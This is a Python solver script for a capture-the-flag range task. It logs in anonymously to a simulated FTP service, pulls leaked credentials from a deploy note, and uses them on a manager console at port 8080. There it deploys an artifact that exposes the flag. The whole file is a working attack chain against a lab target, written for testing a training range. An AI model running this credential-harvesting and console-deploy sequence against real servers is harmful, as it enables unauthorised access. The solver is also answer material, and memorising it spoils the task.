"""Intended-path solver: anon file drop leak, manager console deploy."""

import re
import urllib.parse

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

FTP_PORT = 2121
MGR_PORT = 8080
NOTE_RE = re.compile(r"username:\s*(\S+)\s+password:\s*(\S+)")


def _host(ctx) -> str:  # type: ignore[no-untyped-def]
    return urllib.parse.urlsplit(ctx.url("target")).hostname or "target"


def _ftp_lines(host: str, commands: list[str]) -> list[str]:
    import socket

    sock = socket.create_connection((host, FTP_PORT), timeout=10)
    lines: list[str] = []
    try:
        fobj = sock.makefile("r", encoding="utf-8", errors="replace")
        for cmd in commands:
            sock.sendall((cmd + "\n").encode())
            while True:
                reply = fobj.readline()
                if not reply:
                    break
                lines.append(reply.strip())
                if reply.startswith(("2", "3", "5")) or "--- end" in reply:
                    break
    finally:
        sock.close()
    return lines


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host = _host(ctx)
    detail = None
    captured = None

    try:
        lines = _ftp_lines(
            host,
            [
                "USER anonymous",
                "PASS guest@",
                "LIST pub",
                "RETR pub/deploy-notes.txt",
                "QUIT",
            ],
        )
    except OSError as exc:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="deploy-flagcopy", ok=False, detail=f"ftp-sim unreachable: {exc}"
                )
            ]
        )

    note = "\n".join(lines)
    match = NOTE_RE.search(note)
    if not match:
        detail = f"deploy note not found over anonymous ftp: {note[-200:]}"
        return SolveResult(results=[TaskResult(task_id="deploy-flagcopy", ok=False, detail=detail)])
    user, password = match.group(1), match.group(2)

    auth = httpx.BasicAuth(user, password)
    base = f"http://{host}:{MGR_PORT}"
    console = httpx.get(f"{base}/manager/html", auth=auth, timeout=10)
    if console.status_code != 200:
        detail = f"manager console rejected leaked creds: {console.status_code}"
        return SolveResult(results=[TaskResult(task_id="deploy-flagcopy", ok=False, detail=detail)])

    deployed = httpx.post(
        f"{base}/manager/html/deploy", data={"artifact": "flagcopy"}, auth=auth, timeout=10
    )
    page = httpx.get(f"{base}/flagcopy/", timeout=10)
    flags = find_flags(page.text) if page.status_code == 200 else []
    captured = flags[0] if flags else None
    if not captured:
        detail = (
            f"no flag at /flagcopy/ after deploy "
            f"(deploy={deployed.status_code}, page={page.status_code})"
        )
    else:
        detail = "leaked note creds used; documented flagcopy artifact deployed"

    return SolveResult(
        results=[
            TaskResult(
                task_id="deploy-flagcopy", ok=captured is not None, captured=captured, detail=detail
            )
        ]
    )
